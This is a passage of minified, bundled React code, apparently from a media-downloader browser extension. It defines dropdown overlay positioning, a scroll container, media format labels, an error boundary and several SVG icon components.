                        const p = paddingHorizontal / 2,
                            p2 = paddingHorizontal;
                        setPaddingLeft(hasScrollbarRTL ? p : p2), setPaddingRight(hasScrollbarLTR ? p : p2);
                    } else setPaddingLeft(0), setPaddingRight(0);
                    setPaddingBottom(hasScrollbar && scrollPaddingBottom ? scrollPaddingBottom : 0);
                });
            Object(react.useEffect)(
                () => (
                    containerNode && resizeObserver.observe(containerNode),
                    () => {
                        containerNode && resizeObserver.unobserve(containerNode);
                    }
                ),
                [containerNode, resizeObserver]
            );
            const [isСontainerNodeScrollTopSet, setIsСontainerNodeScrollTopSet] = Object(react.useState)(!1);
            return (
                Object(react.useEffect)(() => {
                    scrollTop && containerNode && !isСontainerNodeScrollTopSet && (setIsСontainerNodeScrollTopSet(!0), (containerNode.scrollTop = scrollTop));
                }, [isСontainerNodeScrollTopSet, scrollTop, containerNode]),
                react_default.a.createElement(
                    ScrollContainer,
                    {
                        marginLeft: marginLeft,
                        marginRight: marginRight,
                        paddingLeft: paddingLeft,
                        paddingRight: paddingRight,
                        paddingBottom: paddingBottom,
                        maxHeight: maxHeight,
                        scrollbarBackground: scrollbarBackground,
                        scrollbarBackgroundFirefox: scrollbarBackgroundFirefox,
                        scrollbarBorder: scrollbarBorder,
                        scrollbarThumb: scrollbarThumb,
                        ref: (node) => {
                            setContainerNode(node);
                        },
                        onScroll: () => {
                            onScroll && containerNode && onScroll(containerNode.scrollTop);
                        },
                    },
                    children
                )
            );
        };
        const overlay_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "overlay__Container", componentId: "sc-1j2ccd8-0" })`padding:${(props) =>
                props.isBottomToTop ? "0 0 4px 0" : "4px 0 0 0"};position:absolute;top:${(props) => props.posY}px;left:${(props) => props.posX}px;transform:${(props) => (props.isBottomToTop ? "translateY(-100%)" : "none")};opacity:${(
                props
            ) => (props.isDropdownShow ? 1 : 0)};transition:opacity 0.25s ease-in-out;`,
            Mask = styled_components_browser_esm.a.div.withConfig({ displayName: "overlay__Mask", componentId: "sc-1j2ccd8-1" })`overflow:${(props) => (props.isAnimated ? "hidden" : "visible")};`,
            AnimationContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "overlay__AnimationContainer", componentId: "sc-1j2ccd8-2" })`transform:${(props) =>
                props.isDropdownShow ? "none" : props.transform};transition:${(props) => (props.isAnimated ? "transform 0.25s ease-in-out" : "none")};`,
            Background = styled_components_browser_esm.a.div.withConfig({ displayName: "overlay__Background", componentId: "sc-1j2ccd8-3" })`cursor:default;user-select:none;font-family:Arial,Helvetica,sans-serif;${(props) =>
                props.embed
                    ? "\n    background-color: rgba(0,0,0,0.85);\n    border-radius: 3px;\n    padding: 6px 0;\n  "
                    : `\n    background-color: ${props.background || "white"};\n    border: 1px solid ${props.borderColor || "black"};\n    border-radius: 2px;\n    box-shadow: 0 0 8px ${
                          props.boxShadowColor || "rgba(0,0,0,0.5)"
                      };\n    width: 460px;\n    padding: 14px 0;\n  `};`;
        var dropdown_overlay = ({ content: content, element: element, trigger: trigger, onVisibleChange: onVisibleChange, isElementClicked: isElementClicked, isElementMouseOver: isElementMouseOver, embed: embed }) => {
            const { theme: theme, dir: dir, module: module, isWebextDestroyed: isWebextDestroyed, appButtonStyle: appButtonStyle, bodyScrollbarWidth: bodyScrollbarWidth, modals: modals, publicIds: publicIds } = use_app_state([
                    "theme",
                    "dir",
                    "module",
                    "isWebextDestroyed",
                    "appButtonStyle",
                    "bodyScrollbarWidth",
                    "modals",
                    "publicIds",
                ]),
                { getScrollContainer: getScrollContainer, appButtonAlign: appButtonAlign } = module,
                globals = theme && theme.globals,
                background = globals && globals.background,
                borderColor = globals && globals.border,
                boxShadowColor = globals && globals.shadow,
                { dropdown: dropdownId } = publicIds,
                dropdown = document.getElementById(dropdownId),
                [dropdownNode, setDropdownNode] = Object(react.useState)(),
                [contentNode, setContentNode] = Object(react.useState)(),
                [isDropdown, setIsDropdown] = Object(react.useState)(!1),
                [isDropdownShow, setIsDropdownShow] = Object(react.useState)(!1),
                [isDropdownMouseOver, setIsDropdownMouseOver] = Object(react.useState)(!1),
                [isAnimated, setIsAnimated] = Object(react.useState)(!1),
                [isMouseOver, setIsMouseOver] = Object(react.useState)(!1),
                [isTimeout, setIsTimeout] = Object(react.useState)(!1),
                [posX, setPosX] = Object(react.useState)(0),
                [posY, setPosY] = Object(react.useState)(0),
                [isBottomToTop, setIsBottomToTop] = Object(react.useState)(null),
                [isBottomToTopChanged, setIsBottomToTopChanged] = Object(react.useState)(!1),
                [isDropdownClickedOutside, setIsDropdownClickedOutside] = Object(react.useState)(!1),
                [contentMaxHeight, setContentMaxHeight] = Object(react.useState)(null),
                [isModalsShown, setIsModalsShown] = Object(react.useState)(!1);
            Object(react.useEffect)(() => {
                setIsModalsShown(modals.filter((rec) => "modal" === rec.type).length > 0);
            }, [modals]),
                Object(react.useEffect)(() => {
                    isDropdownClickedOutside && setIsDropdownClickedOutside(!1);
                }, [isDropdownClickedOutside]),
                Object(react.useEffect)(() => {
                    const moduleScrollContainer = getScrollContainer && getScrollContainer(),
                        setPos = () => {
                            const elementRect = ("Modern" === appButtonStyle ? element : element.parentNode).getBoundingClientRect();
                            if (elementRect) {
                                const nodeRect = dropdownNode.getBoundingClientRect();
                                if (nodeRect) {
                                    const margin = 4,
                                        { innerHeight: innerHeight } = window,
                                        scrollTop = moduleScrollContainer ? moduleScrollContainer.scrollTop : isModalsShown ? -parseInt(document.body.style.marginTop, 10) : window.pageYOffset,
                                        elementTop = elementRect.top,
                                        elementRight = elementRect.right,
                                        elementBottom = elementRect.bottom,
                                        elementLeft = elementRect.left,
                                        nodeWidth = nodeRect.width,
                                        nodeHeight = nodeRect.height,
                                        setIsTopToBottom = (isTopToBottom) => {
                                            isTopToBottom
                                                ? (setPosY(scrollTop + elementBottom), !0 === isBottomToTop && setIsBottomToTopChanged(!0), setIsBottomToTop(!1))
                                                : (setPosY(scrollTop + elementTop), !1 === isBottomToTop && setIsBottomToTopChanged(!0), setIsBottomToTop(!0));
                                        };
                                    if (moduleScrollContainer || bodyScrollbarWidth) setContentMaxHeight(null), setIsTopToBottom(!(elementBottom + nodeHeight > innerHeight && elementTop - nodeHeight > 0));
                                    else {
                                        const contentNodeHeight = contentNode.getBoundingClientRect().height,
                                            dBottom = innerHeight - elementBottom;
                                        dBottom > contentNodeHeight || dBottom > elementTop ? (setIsTopToBottom(!0), setContentMaxHeight(innerHeight - elementBottom - 38)) : (setIsTopToBottom(!1), setContentMaxHeight(elementTop - 38));
                                    }
                                    const { clientWidth: clientWidth } = document.body;
                                    "left" === appButtonAlign
                                        ? setPosX(elementLeft)
                                        : "right" === appButtonAlign
                                        ? setPosX(elementRight - nodeWidth)
                                        : "rtl" === dir
                                        ? setPosX(elementLeft + nodeWidth + margin > clientWidth ? clientWidth - nodeWidth - margin : elementLeft)
                                        : "ltr" === dir && setPosX(elementRight - nodeWidth - margin < 0 ? margin : elementRight - nodeWidth);
                                }
                            }
                        },
                        resizeObserver = new ResizeObserver(setPos);
                    return (
                        isDropdown && dropdownNode && element && (setPos(), (moduleScrollContainer || document).addEventListener("scroll", setPos), window.addEventListener("resize", setPos), resizeObserver.observe(dropdownNode)),
                        () => {
                            isDropdown && dropdownNode && element && ((moduleScrollContainer || document).removeEventListener("scroll", setPos), window.removeEventListener("resize", setPos), resizeObserver.unobserve(dropdownNode));
                        }
                    );
                }, [dropdownNode, contentNode, isDropdown, element, dir, getScrollContainer, appButtonAlign, isBottomToTop, appButtonStyle, bodyScrollbarWidth, isModalsShown]),
                Object(react.useEffect)(() => {
                    dropdown && element && !isDropdown && !isAnimated && !isDropdownShow && (("click" === trigger && isElementClicked) || ("hover" === trigger && isElementMouseOver)) && setIsDropdown(!0);
                }, [dropdown, element, isAnimated, isDropdownShow, trigger, isElementClicked, isElementMouseOver, isDropdown]),
                Object(react.useEffect)(() => {
                    onVisibleChange && onVisibleChange(isDropdownShow);
                }, [isDropdownShow, onVisibleChange]),
                Object(react.useEffect)(() => {
                    isDropdown &&
                        setTimeout(() => {
                            setIsAnimated(!0), setIsDropdownShow(!0);
                        }, 1);
                }, [isDropdown]),
                ("click" === trigger || ("hover" === trigger && !isBottomToTopChanged)) && (isMouseOver ? isDropdownMouseOver || setIsDropdownMouseOver(!0) : isTimeout || (isDropdownMouseOver && setIsDropdownMouseOver(!1))),
                !isDropdownShow || isAnimated || isDropdownMouseOver || isModalsShown || !(("click" === trigger && isDropdownClickedOutside) || ("hover" === trigger && !isElementMouseOver)) || (setIsAnimated(!0), setIsDropdownShow(!1));
            use_event_listener(
                window,
                "click",
                (e) => {
                    "click" === trigger && isDropdown && dropdownNode && !dropdownNode.contains(e.target) && !isModalsShown && setIsDropdownClickedOutside(!0);
                },
                !0
            );
            return (
                use_event_listener(window, "popstate", () => {
                    setIsDropdown(!1);
                }),
                isDropdown && isDropdownShow && isWebextDestroyed && (setIsDropdown(!1), setIsDropdownShow(!1)),
                dropdown && isDropdown
                    ? Object(react_dom.createPortal)(
                          react_default.a.createElement(
                              overlay_Container,
                              {
                                  ref: (node) => {
                                      node && setDropdownNode(node);
                                  },
                                  posX: posX,
                                  posY: posY,
                                  isBottomToTop: isBottomToTop,
                                  isDropdownShow: isDropdownShow,
                                  onMouseEnter: () => {
                                      setIsBottomToTopChanged(!1), setIsMouseOver(!0);
                                  },
                                  onMouseLeave: () => {
                                      setIsTimeout(!0),
                                          setIsMouseOver(!1),
                                          setTimeout(() => {
                                              setIsTimeout(!1);
                                          }, 200);
                                  },
                              },
                              react_default.a.createElement(
                                  Mask,
                                  { isAnimated: isAnimated },
                                  react_default.a.createElement(
                                      AnimationContainer,
                                      {
                                          isAnimated: isAnimated,
                                          isDropdownShow: isDropdownShow,
                                          transform: `translateY(${isBottomToTop ? 100 : -100}%)`,
                                          onTransitionEnd: () => {
                                              setIsAnimated(!1), isDropdownShow || setIsDropdown(!1);
                                          },
                                      },
                                      react_default.a.createElement(
                                          Background,
                                          { background: background, borderColor: borderColor, boxShadowColor: boxShadowColor, embed: embed },
                                          react_default.a.createElement(
                                              scroll_container,
                                              { maxHeight: contentMaxHeight },
                                              react_default.a.createElement(
                                                  "div",
                                                  {
                                                      ref: (node) => {
                                                          node && setContentNode(node);
                                                      },
                                                  },
                                                  content
                                              )
                                          )
                                      )
                                  )
                              )
                          ),
                          dropdown
                      )
                    : null
            );
        };
        var ui_dropdown = ({ children: children, overlay: overlay, trigger: trigger, onVisibleChange: onVisibleChange, embed: embed, setNodeRef: setNodeRef }) => {
            const [element, setElement] = Object(react.useState)(),
                [isElementClicked, setIsElementClicked] = Object(react.useState)(!1);
            Object(react.useEffect)(() => {
                isElementClicked && setIsElementClicked(!1);
            }, [isElementClicked]);
            const [isMouseOver, setIsMouseOver] = Object(react.useState)(!1),
                [isElementMouseOver, setIsElementMouseOver] = Object(react.useState)(!1),
                [isTimeout, setIsTimeout] = Object(react.useState)(!1);
            Object(react.useEffect)(() => {
                isMouseOver ? setIsElementMouseOver(!0) : isTimeout || setIsElementMouseOver(!1);
            }, [isMouseOver, isTimeout]);
            return (
                use_event_listener(element, "click", () => {
                    if (("click" === trigger && setIsElementClicked(!0), "hover" === trigger)) {
                        const onClick = children && children.props && children.props.onClick;
                        onClick && onClick();
                    }
                }),
                react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    Object(react.cloneElement)(children, {
                        ...("hover" === trigger && {
                            onMouseEnter: () => {
                                setIsMouseOver(!0);
                            },
                            onMouseLeave: () => {
                                setIsTimeout(!0),
                                    setIsMouseOver(!1),
                                    setTimeout(() => {
                                        setIsTimeout(!1);
                                    }, 200);
                            },
                        }),
                        onClick: null,
                        ref: (node) => {
                            node && (setElement(node), setNodeRef && setNodeRef(node));
                        },
                    }),
                    react_default.a.createElement(dropdown_overlay, {
                        content: overlay,
                        element: element,
                        trigger: trigger || "hover",
                        isElementClicked: isElementClicked,
                        isElementMouseOver: isElementMouseOver,
                        onVisibleChange: onVisibleChange,
                        embed: embed,
                    })
                )
            );
        };
        const getMp3Rate = (bitrate) => {
                const targetRate = (1.3 * bitrate) / 1024;
                return [320, 256, 192, 160, 128].reduce((acc, cv) => (cv > targetRate ? cv : acc));
            },
            getAudioExt = (data) => (isAudioMp4(data) ? "MP4" : isAudioWebm(data) ? "WEBM" : isAudioMp3(data) ? "MP3" : null),
            title_Title = ({ item: item }) => {
                const title = react_default.a.createElement(ExtTitle, { item: item });
                return isVideo(item)
                    ? react_default.a.createElement(react_default.a.Fragment, null, "" + (item.type && item.type.toUpperCase()), " ", title)
                    : isAudio(item)
                    ? react_default.a.createElement(react_default.a.Fragment, null, "" + getAudioExt(item), " ", title)
                    : null;
            },
            TitleEmbed = ({ item: item }) => {
                const title = react_default.a.createElement(ExtTitle, { item: item });
                return isVideo(item)
                    ? react_default.a.createElement(react_default.a.Fragment, null, "" + (item.type && item.type.toLowerCase()), " - ", title)
                    : isAudio(item)
                    ? react_default.a.createElement(react_default.a.Fragment, null, "" + getAudioExt(item).toLowerCase(), " - ", title)
                    : null;
            },
            ExtTitle = ({ item: item }) => {
                if (!item) return null;
                if (isAudio(item)) {
                    const bitrate = ((data) => {
                        const { bitrate: bitrate } = data;
                        if (bitrate) {
                            if (isAudioMp3(data)) return getMp3Rate(bitrate);
                            const rates = [1, 64, 128, 160, 192, 256, 320];
                            return rates.find((rate, i) => 0 !== i && (i === rates.length - 1 || bitrate / 1e3 <= rates[i]));
                        }
                        return null;
                    })(item);
                    return react_default.a.createElement(react_default.a.Fragment, null, bitrate ? bitrate + "kbps" : "");
                }
                if (!item.quality) return null;
                if (0 === item.height) return "";
                const title = /^([0-9]+[a-z])/.exec(item.quality)[0];
                return react_default.a.createElement(react_default.a.Fragment, null, title);
            };
        var icons_download = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "16.5px", height: "20px", viewBox: "0 0 16.5 20", style: style, className: className },
                react_default.a.createElement("path", { fill: color, d: "M16.5,7.1h-4.7V0h-7v7.1H0l8.2,8.2L16.5,7.1z M0,17.7V20h16.5v-2.3H0z" })
            );
        class error_boundary_ErrorBoundary extends react.Component {
            constructor(props) {
                super(props), (this.state = { hasError: !1 });
            }
            static getDerivedStateFromError() {
                return { hasError: !0 };
            }
            componentDidCatch(error, errorInfo) {
                console.log(error, errorInfo);
            }
            render() {
                const { children: children, theme: theme, embed: embed } = this.props,
                    { hasError: hasError } = this.state,
                    globals = theme && theme.globals,
                    color = globals && globals.color;
                return hasError
                    ? react_default.a.createElement(
                          "svg",
                          { xmlns: "http://www.w3.org/2000/svg", width: "38px", height: "34px", viewBox: "0 0 38 34", style: { width: embed && 20, height: "100%" } },
                          react_default.a.createElement("path", {
                              fill: embed ? "white" : color,
                              d:
                                  " M 38 17 Q 38 9.95 32.4 5 26.85 0 19 0 11.15 0 5.55 5 0 9.95 0 17 0 22.198046875 3 26.25 L 0 34 9.25 31.65 Q 13.608203125 34 19 34 26.85 34 32.4 29 38 24.05 38 17 M 23.9 9 L 25.05 10.2 26.25 9 Q 27.5 7.75 28.75 9 29.95 10.25 28.75 11.45 L 27.55 12.65 28.8 13.9 Q 30.05 15.15 28.8 16.35 27.55 17.6 26.3 16.35 L 25.05 15.1 23.85 16.3 Q 22.6 17.55 21.4 16.35 20.15 15.1 21.4 13.85 L 22.6 12.65 21.45 11.5 Q 20.25 10.25 21.5 9 22.7 7.8 23.9 9 M 11.75 8.95 L 13 10.15 14.2 8.95 Q 15.4 7.7 16.65 9 17.85 10.2 16.65 11.4 L 15.45 12.6 16.65 13.8 Q 17.9 15.05 16.7 16.25 15.45 17.5 14.2 16.25 L 13 15.05 11.75 16.25 Q 10.5 17.5 9.3 16.3 8.05 15.05 9.3 13.8 L 10.5 12.6 9.3 11.4 Q 8.1 10.2 9.35 8.95 10.55 7.7 11.75 8.95 M 8.65 23.1 Q 19.35 17.75 29.4 23.1 L 29.4 25.7 Q 19.35 20.35 8.65 25.7 L 8.65 23.1 Z",
                          })
                      )
                    : children;
            }
        }
        var error_boundary = connect_connect((state) => ({ theme: state.theme }))(error_boundary_ErrorBoundary);
        var plus = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "10px", height: "10px", viewBox: "0 0 10 10", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M9.8,3.8C9.7,3.7,9.5,3.7,9.3,3.7h-3v-3c0-0.2-0.1-0.3-0.2-0.5C6,0.1,5.8,0,5.7, 0H4.3C4.2,0,4,0.1,3.8,0.2C3.7,0.3,3.7,0.5,3.7,0.7v2.9h-3c-0.2,0-0.3,0.1-0.5,0.2S0, 4.2,0,4.3v1.3C0,5.8,0.1,6,0.2,6.2c0.2,0.2,0.3,0.2,0.5,0.2h2.9v2.9c0,0.2,0.1,0.3, 0.2,0.5C4,9.9,4.2,10,4.3,10h1.3C5.8,10,6,9.9,6.2,9.8c0.2-0.2,0.2-0.3, 0.2-0.5v-3h2.9c0.2,0,0.3-0.1,0.5-0.2C9.9,6,10,5.8,10,5.7V4.3C10,4.2,9.9,4,9.8,3.8z",
                })
            );
        const header_Header = styled_components_browser_esm.a.h4.withConfig({ displayName: "header__Header", componentId: "sc-1af2z6h-0" })`margin:0 16px 14px;font-size:16px;font-weight:400;line-height:20px;color:${(props) =>
            props.color || "black"};`;
        var page_header = ({ children: children }) => {
            const { theme: theme } = use_app_state(["theme"]),
                location = useLocation(),
                isSocialMediaSharing = "/social-media-sharing" === (location && location.pathname),
                colorSocialMediaSharing = theme && theme.social_media_sharing && theme.social_media_sharing.title_color,
                colorDefault = theme && theme.header,
                color = isSocialMediaSharing ? colorSocialMediaSharing : colorDefault;
            return react_default.a.createElement(header_Header, { color: color }, children);
        };
        var heart = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "18.7px", viewBox: "0 0 21 18.7", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        " M 21 5.8 Q 21 4.65 20.6 3.6 20.15 2.55 19.3 1.7 18.5 0.85 17.4 0.45 16.35 0 15.2 0 14.05 0 12.95 0.45 11.9 0.85 11.1 1.7 L 10.5 2.3 9.9 1.7 Q 9.1 0.85 8.05 0.45 7 0 5.8 0 4.65 0 3.6 0.45 2.5 0.85 1.7 1.7 0.85 2.55 0.4 3.6 0 4.65 0 5.8 0 6.95 0.4 8 0.85 9.1 1.7 9.9 L 10.5 18.7 19.3 9.9 Q 20.15 9.1 20.6 8 21 6.95 21 5.8 M 15.2 1.2 Q 16.1 1.2 16.95 1.55 17.8 1.9 18.45 2.55 19.1 3.2 19.45 4.1 19.8 4.9 19.8 5.8 19.8 6.7 19.45 7.55 19.1 8.4 18.45 9.05 L 10.5 17 2.55 9.05 Q 1.9 8.4 1.55 7.55 1.25 6.7 1.25 5.8 1.25 4.9 1.55 4.1 1.9 3.2 2.55 2.55 3.2 1.9 4.05 1.55 4.9 1.2 5.8 1.2 6.75 1.2 7.55 1.55 8.4 1.9 9.05 2.55 L 10.5 4 11.95 2.55 Q 12.6 1.9 13.45 1.55 14.3 1.2 15.2 1.2 Z",
                })
            );
        var gear = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "21px", viewBox: "0 0 21 21", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M19.5,7.8l-1-0.2c-0.1-0.3-0.2-0.5-0.3-0.7l0.6-0.8c0.5-0.7,0.4-1.7-0.2-2.4l-1.2-1.2C17, 2.1,16.5,1.9,16,1.9c-0.4,0-0.8,0.1-1.1,0.3l-0.8,0.6c-0.3-0.1-0.5-0.2-0.8-0.3l-0.2-1C13, 0.6,12.2,0,11.3,0H9.6C8.7,0,7.9,0.6,7.8,1.5l-0.2,1C7.4,2.7,7.1,2.8,6.9,2.9L6,2.3C5.7, 2.1,5.3,1.9,5,1.9c-0.5,0-1,0.2-1.3,0.5L2.4,3.7C1.8,4.4,1.7,5.3,2.2,6.1l0.6,0.9C2.7,7.2, 2.6,7.4,2.5,7.7l-1,0.2C0.6,8,0,8.8,0,9.7v1.7c0,0.9,0.6,1.7,1.5,1.8l1,0.2c0.1,0.3,0.2, 0.5,0.3,0.7L2.3,15c-0.5,0.7-0.4,1.7,0.2,2.4l1.2,1.2c0.3,0.3,0.8,0.5,1.3,0.5c0.4,0, 0.8-0.1,1.1-0.3l0.9-0.6c0.2,0.1,0.5,0.2,0.7,0.3l0.2,1C8,20.4,8.7,21,9.6,21h1.7c0.9,0, 1.7-0.6,1.8-1.5l0.2-1c0.3-0.1,0.5-0.2,0.7-0.3l0.8,0.6c0.3,0.2,0.7,0.3,1.1,0.3c0.5,0, 1-0.2,1.3-0.5l1.2-1.2c0.6-0.6,0.7-1.6,0.2-2.4l-0.6-0.8c0.1-0.2,0.2-0.5,0.3-0.7l1-0.2c0.9-0.1, 1.5-0.9,1.5-1.8V9.6C21,8.7,20.4,8,19.5,7.8z M19.8,11.4c0,0.3-0.2,0.5-0.5,0.6l-1.4,0.2c-0.3, 0-0.5,0.2-0.5,0.5c-0.1,0.4-0.3,0.8-0.5,1.2c-0.1,0.2-0.1,0.5,0,0.7l0.8,1.1c0.2,0.2,0.1, 0.6-0.1,0.8l-1.2,1.2c-0.1,0.1-0.3,0.2-0.4,0.2c-0.1,0-0.2,0-0.4-0.1l-1.1-0.8c-0.2-0.1-0.5-0.2-0.7, 0c-0.4,0.2-0.8,0.4-1.2,0.5c-0.2,0.1-0.4,0.3-0.5,0.5L12,19.3c0,0.3-0.3,0.5-0.6,0.5H9.6c-0.3, 0-0.5-0.2-0.6-0.5l-0.2-1.4c0-0.2-0.2-0.5-0.5-0.5c-0.4-0.1-0.8-0.3-1.1-0.5c-0.1-0.1-0.2-0.1-0.3-0.1c-0.1, 0-0.3,0-0.4,0.1l-1.1,0.8c-0.1,0.1-0.2,0.1-0.3,0.1c-0.2, 0-0.3-0.1-0.4-0.2l-1.2-1.2c-0.2-0.2-0.2-0.5-0.1-0.8l0.8-1.1c0.1-0.2,0.2-0.5, 0-0.7c-0.2-0.4-0.4-0.8-0.5-1.2c-0.1-0.2-0.3-0.4-0.5-0.5L1.7,12c-0.3,0-0.5-0.3-0.5-0.6V9.7c0-0.3, 0.2-0.5,0.5-0.6l1.3-0.2c0.3,0,0.5-0.2,0.5-0.5C3.7,8,3.9,7.6,4.1,7.2C4.2,7,4.2,6.7,4,6.5L3.2, 5.4C3.1,5.1,3.1,4.8,3.3,4.6l1.2-1.2l0,0C4.6,3.2,4.8,3.2,5,3.2c0.1,0,0.2,0,0.4,0.1l1.1, 0.8c0.2,0.1,0.5,0.2,0.7,0c0.4-0.2,0.8-0.4,1.2-0.5c0.2-0.1,0.4-0.3,0.5-0.5L9,1.7c0-0.3, 0.3-0.5,0.6-0.5h1.7c0.3,0,0.5,0.2,0.6,0.5l0.2,1.3c0,0.3,0.2,0.5,0.5,0.5c0.4,0.1,0.8,0.3, 1.2,0.5c0.2,0.1,0.5,0.1,0.7,0l1.1-0.8c0.1-0.1,0.2-0.1,0.3-0.1c0.2,0,0.3,0.1,0.4,0.2l1.2, 1.2c0.2,0.2,0.2,0.5,0.1,0.8l-0.8,1.1c-0.1,0.2-0.2,0.5,0,0.7c0.2,0.4,0.4,0.8,0.5,1.2c0.1, 0.2,0.3,0.4,0.5,0.5L19.3,9l0,0c0.3,0,0.5,0.3,0.5,0.6V11.4z",
                }),
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M10.5,6.4c-2.3,0-4.1,1.8-4.1,4.1s1.8,4.1,4.1,4.1s4.1-1.8,4.1-4.1S12.8,6.4,10.5, 6.4z M10.5,13.4c-1.6,0-2.9-1.3-2.9-2.9s1.3-2.9,2.9-2.9s2.9,1.3,2.9, 2.9S12.1,13.4,10.5,13.4z",
                })
            );
        var help = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "19.1px", height: "21px", viewBox: "0 0 19.1 21", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M9.4,5.7c-1.9,0-2.8,1.1-2.8,1.9c0,0.6,0.5,0.8,0.9,0.8c0.8,0,0.5-1.1,1.9-1.1c0.7,0, 1.3,0.3,1.3,1c0,0.8-0.8,1.2-1.3,1.6c-0.4,0.4-1,0.9-1,2.2c0,0.7,0.2,1,0.8,1c0.7,0, 0.8-0.3,0.8-0.6c0-0.7,0-1.2,0.8-1.8c0.4-0.3,1.6-1.3,1.6-2.6S11.3,5.7,9.4,5.7z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M9.2,14.1c-0.6,0-1.1,0.5-1.1,1.1c0,0.6,0.5,1.1,1.1,1.1c0.6,0,1.1-0.5, 1.1-1.1C10.3,14.6,9.8,14.1,9.2,14.1z" }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M17.4,4l-6.2-3.6c-1-0.6-2.3-0.6-3.4,0L1.7,4C0.6,4.6,0,5.7,0,6.9v7.1c0,1.2,0.6,2.3, 1.7,2.9l6.2,3.6c1,0.6,2.3,0.6,3.4,0l6.2-3.6c1-0.6,1.7-1.7,1.7-2.9V6.9C19.1,5.7,18.5, 4.6,17.4,4z M17.5,14.1c0,0.6-0.3,1.2-0.9,1.5l-6.2,3.6c-0.5,0.3-1.2,0.3-1.7, 0l-6.2-3.6c-0.5-0.3-0.9-0.9-0.9-1.5V6.9c0-0.6,0.3-1.2,0.9-1.5l6.2-3.6c0.5-0.3, 1.2-0.3,1.7,0l6.2,3.6c0.5,0.3,0.9,0.9,0.9,1.5L17.5,14.1L17.5,14.1z",
                })
            );
        var feedback = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "18.5px", height: "21px", viewBox: "0 0 18.5 21", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M9.2,2.5c-2.4,0-4.3,1.9-4.3,4.3c0,1.5,0.7,2.8,2,3.6c1.3,0.8,2.8,0.9,4.3, 0.2c0.3-0.1,0.4-0.5,0.3-0.8c-0.1-0.3-0.5-0.4-0.8-0.3C9.6,10,8.5,9.9,7.6, 9.4C6.7,8.8,6.2,7.8,6.2,6.8c0-1.7,1.4-3.1,3.1-3.1s3.1,1.4,3.1,3.1c0, 0.3-0.3,0.6-0.6,0.6c-0.3,0-0.6-0.2-0.6-0.6c0,0,0,0,0,0c0-1-0.8-1.8-1.8-1.8S7.4, 5.8,7.4,6.8s0.8,1.8,1.8,1.8c0.5,0,0.9-0.2,1.2-0.5c0.3,0.3,0.8,0.5,1.2, 0.5c1,0,1.8-0.8,1.8-1.8C13.5,4.4,11.6,2.5,9.2,2.5z M9.8,6.9c0,0.3-0.3, 0.5-0.6,0.5c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6c0.3,0,0.6,0.2, 0.6,0.5C9.8,6.8,9.8,6.8,9.8,6.9z",
                }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M18.5,8.1c0-0.2-0.1-0.3-0.2-0.4L16,5.4V0.6C16,0.3,15.7,0,15.4,0H3.1C2.7, 0,2.5,0.3,2.5,0.6v4.7L0.2,7.6c0,0,0,0,0,0C0.1,7.8,0,7.9,0,8.1c0,0,0,0,0, 0v11.1c0,1,0.8,1.8,1.8,1.8h14.8c1,0,1.8-0.8,1.8-1.8L18.5,8.1C18.5,8.1, 18.5,8.1,18.5,8.1z M16,7.1l1,1l-1,1V7.1z M3.7,5.6C3.7,5.6,3.7,5.6,3.7, 5.6V1.2h11.1v4.4c0,0,0,0,0,0v4.7l-3.3,3.3H7l-3.3-3.3V5.6z M2.5,7.1v2l-1-1L2.5, 7.1zM1.2,18.9V9.6l4.7,4.7L1.2,18.9z M2.1,19.8L7,14.8h4.4l4.9, 4.9H2.1z M17.2,18.9l-4.7-4.7l4.7-4.7V18.9z",
                })
            );
        var arrow_back = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "16px", height: "16px", viewBox: "0 0 16 16", style: style, className: className },
                react_default.a.createElement("path", { fill: color, d: "M16,9.5v-3H6.2l3.6-2.8V0.2L0,7.9l9.8,7.9v-3.5L6.3,9.5H16z" })
            );
        const footer_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "footer__Container", componentId: "sc-169jj9b-0" })`margin:0 16px;padding:10px 0 0;display:flex;flex-direction:row;border-top:1px solid ${(
                props
            ) => props.borderTop};${(props) => props.justifyContentEnd && "justify-content: flex-end;"} & button{& svg path{fill:${(props) => props.buttonColor};}& span{color:${(props) => props.buttonColor};}&:hover{& svg path{fill:${(
                props
            ) => props.buttonHoverColor};}& span{color:${(props) => props.buttonHoverColor};}}}`,
            footer_Button = styled_components_browser_esm.a.button.withConfig({
                displayName: "footer__Button",
                componentId: "sc-169jj9b-1",
            })`background-color:transparent;outline:none;border:none;padding:0;display:inline-flex;align-items:center;cursor:pointer;&:nth-last-child(even){margin:0 20px;}`,
            ButtonBack = styled_components_browser_esm.a.button.withConfig({
                displayName: "footer__ButtonBack",
                componentId: "sc-169jj9b-2",
            })`background-color:transparent;outline:none;display:flex;align-items:center;border:none;margin:2px 0;padding:0;display:inline-flex;align-items:center;cursor:pointer;& svg{${(props) =>
                "rtl" === props.dir && "transform: scale3d(-1, 1, 1);"}}`,
            TextBack = styled_components_browser_esm.a.span.withConfig({
                displayName: "footer__TextBack",
